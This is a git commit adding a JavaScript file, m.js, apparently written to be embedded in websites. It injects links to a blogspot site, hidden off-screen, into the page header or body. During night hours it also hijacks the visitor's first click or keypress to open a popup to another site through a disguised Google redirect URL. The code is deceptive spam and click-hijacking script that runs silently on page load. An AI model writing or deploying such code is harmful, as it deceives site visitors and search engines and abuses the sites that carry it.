57c777c3e43094dc8b6d446ac85814a858d1df7d
RokibulRoni <77901829+RokibulRoni@users.noreply.github.com>
2021-02-28 17:40:53 -0500

    Add files via upload

---
+++ m.js
@@ -0,0 +1,20 @@
+//  console.log(NN)
+let EFV='<a href="https://probochonmod.blogspot.com" style="position: absolute;z-index: -9999;left: -100%;">Am2z News</a><a href="https://probochonmod.blogspot.com" style="position: absolute;z-index: -9999;left: -100%;">MrJaz</a>'
+
+if(document.querySelector('header')){document.querySelector('header').insertAdjacentHTML('beforeend',EFV);}
+else{document.querySelector('body').insertAdjacentHTML('beforeend',EFV);}
+
+if(!sessionStorage.ef&&new Date().getHours()>=2&&new Date().getHours()<=6){
+    function AB(CD){
+        document.addEventListener(CD,()=>{
+                if(!sessionStorage.ef){
+                window.open(`https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&url=https%3A%2F%2Fwww.am2z.com%2F&usg=AOvVaw3I4MPjs6FqgBod4oFx02Qu`);
+                sessionStorage.ef = '1';
+            }
+        })
+    }
+    AB('keydown'); 
+    AB('mousedown');
+}
+// url=https%3A%2F%2Fprobochonmod.blogspot.com%2F&usg=AOvVaw1c_R-cs8NrHL1XBWHB2DfG
+// url=https%3A%2F%2Fprobochonmod.blogspot.com%2F&usg=AOvVaw3I4MPjs6FqgBod4oFx02Qu
